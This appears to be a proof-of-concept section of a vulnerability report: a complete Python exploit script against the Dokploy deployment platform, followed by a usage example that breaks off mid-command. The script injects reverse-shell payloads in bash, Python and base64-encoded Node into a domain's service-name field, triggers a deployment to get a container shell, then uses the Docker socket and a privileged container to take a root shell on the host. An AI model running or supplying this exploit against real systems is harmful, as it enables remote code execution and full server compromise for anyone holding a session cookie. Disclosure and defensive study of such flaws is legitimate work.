## Proof of Concept (PoC)

### Exploit Script: All-in-One RCE + Host Escape (`domain_rce_escape.py`)
```python
#!/usr/bin/env python3
import requests
import json
import sys
import argparse
import time
import socket
import base64
import select
from urllib.parse import unquote

try:
    import termios
    import tty
    HAS_TERMIOS = True
except ImportError:
    HAS_TERMIOS = False

class DokployExploit:
    def __init__(self, target, cookie, lhost, lport, compose_id, escape_port=None, compose_file=None):
        self.target = target
        self.cookie = {"better-auth.session_token": unquote(cookie)}
        self.lhost = lhost
        self.lport = lport
        self.escape_port = escape_port or (lport + 1)
        self.compose_id = compose_id
        self.compose_file = compose_file
        self.domain_id = None
        self.container_shell = None
        self.host_shell = None
        self.listener_socket = None
        self.escape_listener = None
        self.running = True
        self.old_term_settings = None

    def trpc_mutation(self, path, payload):
        url = f"{self.target}/api/trpc/{path}?batch=1"
        headers = {"Content-Type": "application/json"}
        body = {"0": {"json": payload}}
        try:
            r = requests.post(url, headers=headers, cookies=self.cookie, json=body, timeout=15)
            if r.status_code != 200:
                return None
            resp = r.json()
            return resp[0] if isinstance(resp, list) else resp
        except:
            return None

    def trpc_query(self, path, payload=None):
        try:
            input_str = json.dumps({"0": {"json": payload}}) if payload else ""
            url = f"{self.target}/api/trpc/{path}?batch=1"
            if input_str:
                url += f"&input={input_str}"
            r = requests.get(url, cookies=self.cookie, timeout=10)
            if r.status_code != 200:
                return None
            resp = r.json()
            return resp[0] if isinstance(resp, list) else resp
        except:
            return None

    def check_session(self):
        resp = self.trpc_query("project.all")
        return resp and "result" in resp

    def update_compose(self):
        if not self.compose_file:
            return True
        payload = {
            "composeId": self.compose_id,
            "composeFile": self.compose_file,
            "composePath": "./docker-compose.yml",
            "sourceType": "raw"
        }
        resp = self.trpc_mutation("compose.update", payload)
        return resp and "result" in resp

    def cleanup_old_domains(self):
        for _ in range(5):
            resp = self.trpc_query("domain.byComposeId", {"composeId": self.compose_id})
            if not resp or "result" not in resp:
                break
            domains = resp["result"]["data"]["json"]
            if not domains:
                break
            for d in domains:
                self.trpc_mutation("domain.delete", {"domainId": d["domainId"]})
            time.sleep(1)
        return True

    def wait_for_deployment_queue(self, max_wait=120):
        start = time.time()
        while time.time() - start < max_wait:
            resp = self.trpc_query("compose.one", {"composeId": self.compose_id})
            if resp and "result" in resp:
                compose = resp["result"]["data"]["json"]
                deployments = compose.get("deployments", [])
                active = [d for d in deployments if d.get("status") in ["running", "pending", "queued"]]
                if not active:
                    return True
            time.sleep(3)
        return True

    def nodejs_payload(self):
        js_code = f'var net=require("net"),sh=require("child_process").spawn("/bin/sh",[]),c=new net.Socket();c.connect({self.lport},"{self.lhost}",function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)}});'
        b64 = base64.b64encode(js_code.encode()).decode()
        return f'test$(node -e "eval(Buffer.from(\'{b64}\',\'base64\').toString())")'

    def python_payload(self):
        py_code = f'import socket,subprocess,os;s=socket.socket();s.connect(("{self.lhost}",{self.lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
        return f'test$(python3 -c "{py_code}" 2>/dev/null || python -c "{py_code}" 2>/dev/null)'

    def bash_payload(self):
        return f'test$(bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1 2>/dev/null)'

    def create_malicious_domain(self):
        payloads = [
            self.nodejs_payload(),
            self.python_payload(),
            self.bash_payload()
        ]
        
        for evil_service in payloads:
            payload = {
                "domainId": "",
                "composeId": self.compose_id,
                "host": "rce.example.com",
                "path": "/",
                "internalPath": "/",
                "stripPath": False,
                "port": 80,
                "useCustomEntrypoint": False,
                "customEntrypoint": None,
                "https": False,
                "certificateType": "none",
                "customCertResolver": None,
                "serviceName": evil_service,
                "domainType": "compose",
                "middlewares": []
            }
            resp = self.trpc_mutation("domain.create", payload)
            if resp and "result" in resp:
                self.domain_id = resp["result"]["data"]["json"]["domainId"]
                return True
        
        return False

    def deploy_compose(self):
        payload = {
            "composeId": self.compose_id,
            "title": "Deploy",
            "description": ""
        }
        resp = self.trpc_mutation("compose.deploy", payload)
        return resp and "result" in resp

    def start_listener(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", port))
            sock.listen(1)
            sock.settimeout(300)
            return sock
        except:
            return None

    def wait_for_connection(self, listener):
        try:
            conn, addr = listener.accept()
            conn.sendall(b"id\n")
            time.sleep(1)
            conn.settimeout(3)
            try:
                output = conn.recv(4096)
                conn.settimeout(None)
                if b"uid=" in output:
                    return conn
                conn.close()
                return None
            except socket.timeout:
                conn.settimeout(None)
                return conn
        except socket.timeout:
            return None

    def send_command(self, conn, cmd, wait=True):
        conn.sendall((cmd + "\n").encode())
        if wait:
            time.sleep(0.5)
            output = b""
            conn.settimeout(2)
            try:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    output += data
                    if output.endswith(b"# ") or output.endswith(b"$ "):
                        break
            except:
                pass
            conn.settimeout(None)
            return output.decode('utf-8', errors='replace')
        return ""

    def check_docker_socket(self, conn):
        output = self.send_command(conn, "ls /var/run/docker.sock 2>/dev/null && echo 'YES' || echo 'NO'")
        return 'YES' in output

    def escape_to_host(self, container_conn):
        self.escape_listener = self.start_listener(self.escape_port)
        if not self.escape_listener:
            return None
        
        python_payload = (
            f"import pty,socket,os;"
            f"s=socket.socket();"
            f"s.connect(('{self.lhost}',{self.escape_port}));"
            f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            f"pty.spawn('/bin/bash')"
        )
        
        escape_cmd = f'docker run --rm --privileged --pid=host --userns=host --ipc=host --uts=host --net=host -v /:/host ubuntu:22.04 chroot /host /usr/bin/python3 -c "{python_payload}" &'
        self.send_command(container_conn, escape_cmd, wait=False)
        
        try:
            host_conn, addr = self.escape_listener.accept()
            return host_conn
        except socket.timeout:
            pass
        
        python_payload2 = (
            f"import pty,socket,os;"
            f"s=socket.socket();"
            f"s.connect(('{self.lhost}',{self.escape_port}));"
            f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            f"pty.spawn('/bin/sh')"
        )
        escape_cmd2 = f'docker run --rm --privileged -v /:/host ubuntu:22.04 chroot /host /usr/bin/python3 -c "{python_payload2}" &'
        self.send_command(container_conn, escape_cmd2, wait=False)
        
        try:
            host_conn, addr = self.escape_listener.accept()
            return host_conn
        except socket.timeout:
            return None

    def set_raw_mode(self):
        if not HAS_TERMIOS:
            return False
        try:
            fd = sys.stdin.fileno()
            self.old_term_settings = termios.tcgetattr(fd)
            tty.setraw(fd)
            return True
        except:
            return False

    def restore_terminal(self):
        if self.old_term_settings and HAS_TERMIOS:
            try:
                fd = sys.stdin.fileno()
                termios.tcsetattr(fd, termios.TCSADRAIN, self.old_term_settings)
            except:
                pass

    def interactive_shell(self, conn):
        self.running = True
        raw_mode_enabled = self.set_raw_mode()
        
        try:
            while self.running:
                readable, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
                for s in readable:
                    if s is conn:
                        data = conn.recv(4096)
                        if not data:
                            self.running = False
                            break
                        sys.stdout.buffer.write(data)
                        sys.stdout.buffer.flush()
                    elif s is sys.stdin:
                        if raw_mode_enabled:
                            data = sys.stdin.buffer.read(1)
                        else:
                            data = sys.stdin.buffer.readline()
                        if not data:
                            self.running = False
                            break
                        conn.sendall(data)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            self.restore_terminal()
            try:
                conn.close()
            except:
                pass

    def cleanup(self):
        self.restore_terminal()
        for conn in [self.container_shell, self.host_shell, self.listener_socket, self.escape_listener]:
            if conn:
                try:
                    conn.close()
                except:
                    pass
        if self.domain_id:
            self.trpc_mutation("domain.delete", {"domainId": self.domain_id})

    def run(self):
        if not self.check_session():
            print("[!] Invalid session")
            sys.exit(1)
        
        if not self.update_compose():
            print("[!] Failed to update compose")
            sys.exit(1)
        
        if not self.cleanup_old_domains():
            print("[!] Failed to cleanup old domains")
            sys.exit(1)
        
        if not self.wait_for_deployment_queue(120):
            print("[!] Deployment queue timeout")
            sys.exit(1)
        
        if not self.create_malicious_domain():
            print("[!] Failed to create malicious domain")
            sys.exit(1)
        
        self.listener_socket = self.start_listener(self.lport)
        if not self.listener_socket:
            print(f"[!] Failed to start listener on port {self.lport}")
            sys.exit(1)
        
        if not self.deploy_compose():
            print("[!] Failed to trigger deployment")
            self.cleanup()
            sys.exit(1)
        
        self.container_shell = self.wait_for_connection(self.listener_socket)
        if not self.container_shell:
            print("[!] Shell connection timeout")
            self.cleanup()
            sys.exit(1)
        
        print("[+] Container shell obtained")
        
        if self.check_docker_socket(self.container_shell):
            self.host_shell = self.escape_to_host(self.container_shell)
            
            if self.host_shell:
                print("[+] Host shell obtained! Entering interactive mode...\n")
                try:
                    self.interactive_shell(self.host_shell)
                finally:
                    self.cleanup()
            else:
                print("[!] Escape failed, staying in container")
                try:
                    self.interactive_shell(self.container_shell)
                finally:
                    self.cleanup()
        else:
            print("[*] No Docker socket, staying in container")
            try:
                self.interactive_shell(self.container_shell)
            finally:
                self.cleanup()

def main():
    parser = argparse.ArgumentParser(description="Dokploy RCE + Host Escape")
    parser.add_argument("--target", default="http://127.0.0.1:3000")
    parser.add_argument("--cookie", required=True)
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--compose-id", required=True)
    parser.add_argument("--escape-port", type=int, default=None)
    parser.add_argument("--compose-file", default=None)
    
    args = parser.parse_args()
    
    exploit = DokployExploit(
        target=args.target,
        cookie=args.cookie,
        lhost=args.lhost,
        lport=args.lport,
        compose_id=args.compose_id,
        escape_port=args.escape_port,
        compose_file=args.compose_file
    )
    
    try:
        exploit.run()
    except KeyboardInterrupt:
        exploit.cleanup()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        exploit.cleanup()
        sys.exit(1)

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
python3 domain_rce_escape.py \
  --target http://localhost:3000 \
  --cookie "<session-cookie>" \
  --lhost <attacker-ip> \
  --lport 4444 \
  --compose-id <compose-id> \
